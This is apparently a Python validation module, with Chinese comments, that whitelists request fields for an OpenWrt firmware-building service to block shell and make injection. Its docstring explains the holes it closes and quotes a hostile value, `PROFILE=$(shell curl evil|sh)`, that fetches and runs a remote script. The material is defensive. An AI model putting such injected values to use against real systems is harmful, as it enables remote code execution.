"""
构建入参白名单 —— 统一收口所有会流向 shell / make / 文件路径的请求字段。

为什么必须存在这个模块（真实事故面）：

1. `builder.ensure_imagebuilder()` 里有一处
       subprocess.run(f"zstd -dc {tarball} | tar -xf - -C {tmp}", shell=True)
   `tarball` 由 `ib_dir_name(version, target)` 拼成。`target` 直接取自请求体，
   原先零校验 —— 攻击者在 target 里塞 `$()` / 反引号 / `;` 即可命令执行。

2. `builder.build()` 里
       make = ["make", "image", f"PROFILE={profile}", "PACKAGES=...", f"FILES={f}"]
   make 会把命令行上的 `VAR=value` 当变量定义并**展开其值**，
   于是 `PROFILE=$(shell curl evil|sh)` 会在解析期执行。
   `packages` / `profile` 同样零校验。

3. `version` 会进入文件名与上游 URL，`profile` 会进入 bin 目录路径。

本模块只做一件事：把「合法」定义清楚，并在最靠近消费方的地方强制校验。
调用方两处（main 的路由层、builder 的执行层）都做，构成纵深防御。
"""
from __future__ import annotations

import json
import os
import re

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA = os.path.join(ROOT, "data")

# --------------------------------------------------------------------------- #
# 字符集白名单
# --------------------------------------------------------------------------- #
# 目标平台：如 x86/64、x86/generic、rockchip/armv8、armsr/armv8
# 只允许字母数字 + 斜杠/横线/下划线/点，且不允许首尾分隔符、不允许连续分隔符。
TARGET_RE = re.compile(r"^[A-Za-z0-9_]+(?:[/._-][A-Za-z0-9_]+)*$")
# 机型 profile：OpenWrt 里形如 generic、x86_64、tplink_archer-c7-v2
PROFILE_RE = re.compile(r"^[A-Za-z0-9_][A-Za-z0-9_.-]{0,63}$")
# 软件包名：可选前导 `-`（表示排除），其余只允许包名字符
PKG_RE = re.compile(r"^-?[A-Za-z0-9][A-Za-z0-9_.+-]{0,127}$")
# 版本号：25.12 / 24.10 / 25.12.5
VERSION_RE = re.compile(r"^[0-9]{1,2}\.[0-9]{1,2}(?:\.[0-9]{1,3})?$")
# 内核版本覆盖项（可选高级项）
KERNEL_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.+-]{0,63}$")
# 固件默认主机名：RFC1123 允许字母数字与 . -（不允许下划线，也不允许空标签）
HOSTNAME_RE = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?"
                         r"(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*$")

MAX_PACKAGES = 500
ROOTFS_MIN_MB = 64
ROOTFS_MAX_MB = 4096


class BuildParamError(ValueError):
    """入参不合法。消息可直接回给用户（不含内部路径/命令）。"""


def _known_targets():
    """从本地离线数据集读出全部合法 target。读不到时返回 None（降级为正则校验）。"""
    try:
        p = os.path.join(DATA, "json", "v1", "overview.json")
        with open(p, encoding="utf-8") as f:
            ov = json.load(f)
        out = set((ov.get("branches") or {}).keys())
        for b in (ov.get("branches") or {}).values():
            if isinstance(b, dict):
                out.update((b.get("targets") or {}).keys())
        # 去掉 "24.10"/"25.12" 这类分支名，只留含斜杠的 target
        return {t for t in out if "/" in t}
    except Exception:
        return None


_KNOWN_TARGETS = None


def known_targets() -> set:
    global _KNOWN_TARGETS
    if _KNOWN_TARGETS is None:
        _KNOWN_TARGETS = _known_targets() or set()
    return _KNOWN_TARGETS


def check_target(target) -> str:
    t = (target or "").strip()
    if not t:
        raise BuildParamError("缺少编译目标（target）")
    if len(t) > 64 or not TARGET_RE.fullmatch(t):
        raise BuildParamError("编译目标含有非法字符")
    known = known_targets()
    # 数据集可用时做强校验（白名单），不可用时退化为字符集校验
    if known and t not in known:
        raise BuildParamError(f"不支持的编译目标 {t}")
    return t


def check_profile(profile) -> str:
    p = (profile or "").strip() or "generic"
    if not PROFILE_RE.fullmatch(p):
        raise BuildParamError("机型（profile）含有非法字符")
    return p


def check_version(version) -> str:
    v = (version or "").strip()
    if not v:
        return ""
    if not VERSION_RE.fullmatch(v):
        raise BuildParamError("版本号格式非法")
    return v


def check_packages(packages) -> list:
    if packages is None:
        return []
    if not isinstance(packages, list):
        raise BuildParamError("packages 必须是数组")
    if len(packages) > MAX_PACKAGES:
        raise BuildParamError(f"软件包数量超过上限 {MAX_PACKAGES}")
    out = []
    for p in packages:
        if not isinstance(p, str):
            raise BuildParamError("软件包名必须是字符串")
        p = p.strip()
        if not p:
            continue
        if not PKG_RE.fullmatch(p):
            raise BuildParamError(f"非法的软件包名：{p[:40]}")
        out.append(p)
    return out


def check_rootfs(v) -> int:
    try:
        n = int(v)
    except (TypeError, ValueError):
        raise BuildParamError("根分区容量必须是整数")
    if not (ROOTFS_MIN_MB <= n <= ROOTFS_MAX_MB):
        raise BuildParamError(f"根分区容量需在 {ROOTFS_MIN_MB}-{ROOTFS_MAX_MB} MB 之间")
    return n


def check_kernel(v) -> str:
    k = (v or "").strip()
    if not k:
        return ""
    if not KERNEL_RE.fullmatch(k):
        raise BuildParamError("内核版本含有非法字符")
    return k


def check_hostname(v) -> str:
    """固件默认主机名。

    ★ 这个键一直在 ALLOWED_KEYS 里，PHP 侧（Engine::injectDefaults）也真的
      会写进 uci-defaults，但 Python 侧此前**只白名单、不校验、不使用** ——
      单独用 API 传 hostname 的用户拿到的固件主机名根本没变（静默失效）。
      现在两侧一致：都写进 uci-defaults 的 `uci set system.@system[0].hostname=`。
    """
    h = (v or "").strip()
    if not h:
        return ""
    if len(h) > 63 or not HOSTNAME_RE.fullmatch(h):
        raise BuildParamError("主机名不合法（仅字母数字、-、. ，每段不超过 63 位）")
    return h


def check_bool(v) -> bool:
    if isinstance(v, bool):
        return v
    if isinstance(v, (int, float)):
        return bool(v)
    if isinstance(v, str):
        return v.strip().lower() in ("1", "true", "yes", "on")
    return False


ALLOWED_KEYS = {
    "target", "profile", "version", "branch", "packages", "package_changes",
    "defaults", "filesystem", "rootfs_size_mb", "efi", "vmdk", "image_type",
    "kernel_v", "wanlan", "usb_net", "usb_wireless", "https_backend",
    "expose_ports", "quick_url", "ipv6", "dhcp", "eflasher", "diff_packages",
    "files_path", "hostname", "email",
}
# ★ 从白名单里删掉的三个键：`signature` / `more` / `settings`。
#   它们原先被接受、被原样存进 payload，但**两版后端、GH Actions 的
#   workflow_dispatch 入参、前端表单里都没有任何一处消费它们** ——
#   即「API 声称支持、实际静默忽略」。白名单只留真正会被用到的键。
#   （`email` 保留：main.py 会把它写进队列 meta，用于构建完成通知。）


def sanitize(req: dict) -> dict:
    """就地净化构建请求，返回新 dict。任何非法项直接抛 BuildParamError。

    注意：未知键被丢弃（不是报错），避免前端扩展字段把构建搞挂。
    """
    if not isinstance(req, dict):
        raise BuildParamError("请求体必须是 JSON 对象")

    out = {}
    for k, v in req.items():
        if k not in ALLOWED_KEYS:
            continue
        out[k] = v

    out["target"] = check_target(out.get("target"))
    out["profile"] = check_profile(out.get("profile"))
    if out.get("version"):
        out["version"] = check_version(out["version"])
    out["packages"] = check_packages(out.get("packages"))
    if out.get("package_changes") is not None:
        out["package_changes"] = check_packages(out.get("package_changes"))
    if out.get("rootfs_size_mb") is not None:
        out["rootfs_size_mb"] = check_rootfs(out["rootfs_size_mb"])
    if out.get("kernel_v"):
        out["kernel_v"] = check_kernel(out["kernel_v"])
    if out.get("hostname"):
        out["hostname"] = check_hostname(out["hostname"])

    # 自定义文件包路径：只允许 uploads 下的相对路径形态，绝不含 .. 或绝对路径
    fp = str(out.get("files_path") or "").strip()
    if fp:
        # 绝对路径与 Windows 盘符一律拒绝（纵深防御：即便下游用了 basename 也不放过）
        if fp.startswith(("/", "\\")) or re.match(r"^[A-Za-z]:", fp):
            raise BuildParamError("自定义文件包路径非法（不允许绝对路径）")
        parts = [p for p in fp.replace("\\", "/").split("/") if p not in ("", ".")]
        if len(parts) > 4 or any(p == ".." for p in parts):
            raise BuildParamError("自定义文件包路径非法")
        if any(not re.fullmatch(r"[A-Za-z0-9_.\u4e00-\u9fff-]{1,80}", p) for p in parts):
            raise BuildParamError("自定义文件包路径含非法字符")
        out["files_path"] = "/".join(parts)

    # 自由文本字段：只做长度与类型约束，内容不进入 shell/make
    # （hostname 已由 check_hostname() 单独按 RFC1123 校验，不在这里放宽到 200 字符）
    for k in ("quick_url",):
        if out.get(k) is not None:
            v = str(out[k])
            if len(v) > 200:
                raise BuildParamError(f"{k} 过长")
            out[k] = v
    d = str(out.get("defaults") or "")
    if len(d) > 20000:
        raise BuildParamError("defaults 脚本过长（上限 20000 字符）")
    out["defaults"] = d

    return out
